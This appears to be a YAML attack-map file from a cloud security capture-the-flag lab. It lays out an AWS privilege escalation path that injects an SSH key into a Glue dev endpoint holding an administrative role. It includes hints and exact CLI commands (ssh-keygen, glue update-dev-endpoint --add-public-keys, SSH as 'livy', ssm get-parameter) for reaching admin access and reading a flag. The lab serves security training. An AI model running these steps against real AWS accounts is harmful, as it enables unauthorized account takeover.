attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-glue-002-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has glue:UpdateDevEndpoint permission, which allows adding an SSH
        public key to existing Glue development endpoints. An existing endpoint is already
        running with an attached administrative IAM role.

    - id: glue-endpoint
      label: "Glue Dev Endpoint"
      type: resource
      subType: glue-job
      arn: "arn:aws:glue:{region}:{account_id}:devEndpoint/pl-prod-glue-002-to-admin-endpoint"
      description: >
        This pre-existing Glue development endpoint has an administrative IAM role attached
        to it. By injecting your SSH public key via glue:UpdateDevEndpoint and then connecting
        over SSH, you can execute AWS CLI commands that run with the full permissions of the
        endpoint's attached role.

    - id: target-role
      label: "Admin Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-glue-002-to-admin-target-role"
      description: >
        This IAM role has AdministratorAccess and is attached to the Glue development endpoint.
        Once connected via SSH, AWS CLI commands execute with the full permissions of this role,
        granting unrestricted access to the AWS account.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/glue-002-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions. Once you have SSH access
        to the Glue dev endpoint running as the admin role, you can use the endpoint's
        AWS CLI environment to call ssm:GetParameter and read the flag directly.

  edges:
    - from: starting-principal
      to: glue-endpoint
      label: "glue:UpdateDevEndpoint"
      description: >
        Add an attacker-controlled SSH public key to the existing Glue dev endpoint.
        After the endpoint finishes updating (status returns to READY), SSH access is
        available using the corresponding private key.
      hints:
        - "Use glue:UpdateDevEndpoint with --add-public-keys to inject your SSH public key into the existing endpoint. Wait for the endpoint status to return to READY, then retrieve its public address with glue:GetDevEndpoint."
        - "Connect via SSH as the 'livy' user using your private key. The endpoint's AWS CLI environment is pre-configured with the attached admin role's credentials via IMDS — no additional credential setup needed."
        - "Browse to https://pathfinding.cloud/paths/glue-002 for technique details."
      commands:
        - description: "Generate a temporary SSH key pair"
          command: "ssh-keygen -t rsa -b 2048 -f /tmp/glue_attack_key -N ''"
        - description: "Add the SSH public key to the Glue dev endpoint"
          command: "aws glue update-dev-endpoint --endpoint-name pl-prod-glue-002-to-admin-endpoint --add-public-keys \"$(cat /tmp/glue_attack_key.pub)\""
        - description: "Wait for the endpoint to return to READY status"
          command: "aws glue get-dev-endpoint --endpoint-name pl-prod-glue-002-to-admin-endpoint --query 'DevEndpoint.Status'"
        - description: "Retrieve the SSH address for the endpoint"
          command: "aws glue get-dev-endpoint --endpoint-name pl-prod-glue-002-to-admin-endpoint --query 'DevEndpoint.PublicAddress' --output text"

    - from: glue-endpoint
      to: target-role
      label: "SSH → assume role"
      description: >
        Connect to the endpoint over SSH and execute AWS CLI commands. The endpoint's
        EC2 instance runs with the attached administrative IAM role, so all AWS CLI
        calls inherit that role's permissions.
      hints: []
      commands:
        - description: "SSH into the Glue dev endpoint"
          command: "ssh -i /tmp/glue_attack_key livy@<endpoint-public-address>"
        - description: "Verify administrative access from within the endpoint"
          command: "aws iam list-users"

    - from: target-role
      to: ctf-flag
      label: "ssm:GetParameter"
      description: >
        With the Glue dev endpoint running as the admin role, execute ssm:GetParameter
        from within the SSH session to read the CTF flag. The AdministratorAccess policy
        on the attached role grants ssm:GetParameter on all parameters, so no additional
        permissions are required.
      hints:
        - "Run ssm:GetParameter with the full parameter path from inside the SSH session on the endpoint, where the admin role credentials are automatically available."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store (run from within the SSH session on the Glue endpoint)"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/glue-002-to-admin --query 'Parameter.Value' --output text"
